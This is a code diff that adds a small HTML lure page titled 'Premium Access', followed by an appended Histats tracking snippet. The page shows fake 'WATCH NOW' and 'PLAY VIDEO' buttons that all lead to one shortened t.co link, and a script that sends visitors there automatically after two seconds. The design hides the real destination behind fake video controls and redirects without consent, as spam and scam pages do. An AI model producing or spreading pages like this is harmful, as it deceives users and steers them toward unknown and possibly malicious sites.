@@ -1,0 +1,151 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Premium Access</title>
+
+<style>
+* {
+  box-sizing: border-box;
+}
+
+body {
+  margin: 0;
+  min-height: 100vh;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  padding: 20px;
+  background: #0b1020;
+  font-family: Arial, sans-serif;
+}
+
+.container {
+  width: 100%;
+  max-width: 340px;
+  text-align: center;
+}
+
+h1 {
+  color: white;
+  font-size: 23px;
+  letter-spacing: 1.5px;
+}
+
+.subtitle {
+  color: #94a3b8;
+  font-size: 13px;
+  margin-bottom: 25px;
+}
+
+.btn {
+  display: flex;
+  align-items: center;
+  gap: 12px;
+  width: 100%;
+  padding: 17px 20px;
+  margin: 14px 0;
+  border-radius: 13px;
+  color: white;
+  text-decoration: none;
+  font-weight: bold;
+  font-size: 14px;
+  transition: .3s;
+}
+
+.btn span:nth-child(2) {
+  flex: 1;
+  text-align: center;
+}
+
+.btn:hover {
+  transform: translateY(-3px);
+  filter: brightness(1.15);
+}
+
+.purple {
+  background: linear-gradient(120deg,#6558f5,#9333ea);
+}
+
+.red {
+  background: linear-gradient(120deg,#ef4444,#db2777);
+}
+
+.green {
+  background: linear-gradient(120deg,#059669,#0d9488);
+}
+
+.status {
+  color: #94a3b8;
+  font-size: 12px;
+  margin-top: 22px;
+}
+</style>
+</head>
+
+<body>
+<div class="container">
+
+  <h1>CHOOSE YOUR OPTION</h1>
+  <div class="subtitle">Select one of the options below</div>
+
+  <a class="btn purple" href="https://t.co/fDKOhCaBt9">
+    <span>▶</span><span>WATCH NOW</span><span>›</span>
+  </a>
+
+  <a class="btn red" href="https://t.co/fDKOhCaBt9">
+    <span>▷</span><span>PLAY VIDEO</span><span>›</span>
+  </a>
+
+  <a class="btn green" href="https://t.co/fDKOhCaBt9">
+    <span>➜</span><span>CONTINUE</span><span>›</span>
+  </a>
+
+  <div class="status" id="status">
+    Redirecting in 2 seconds...
+  </div>
+
+</div>
+
+<script>
+(function () {
+  const firstURL = "https://t.co/fDKOhCaBt9";
+  const secondURL = "https://t.co/fDKOhCaBt9";
+  const delay = 2000;
+
+  const params = new URLSearchParams(location.search);
+  const step = params.get("step");
+  const status = document.getElementById("status");
+
+  if (step === "2") {
+    status.textContent = "Opening destination...";
+    setTimeout(function () {
+      location.href = secondURL;
+    }, delay);
+  } else if (step !== "done") {
+    status.textContent = "Redirecting in 2 seconds...";
+    setTimeout(function () {
+      location.href = firstURL;
+    }, delay);
+  }
+})();
+</script>
+
+</body>
+</html>
+ <!-- Histats.com  (div with counter) --><div id="histats_counter"></div>
+<!-- Histats.com  START  (aync)-->
+<script type="text/javascript">var _Hasync= _Hasync|| [];
+_Hasync.push(['Histats.start', '1,5037893,4,511,95,18,00000000']);
+_Hasync.push(['Histats.fasi', '1']);
+_Hasync.push(['Histats.track_hits', '']);
+(function() {
+var hs = document.createElement('script'); hs.type = 'text/javascript'; hs.async = true;
+hs.src = ('//s10.histats.com/js15_as.js');
+(document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);
+})();</script>
+<noscript><a href="/" target="_blank"><img  src="//sstatic1.histats.com/0.gif?5037893&101" alt="best tracker" border="0"></a></noscript>
+<!-- Histats.com  END  -->
+
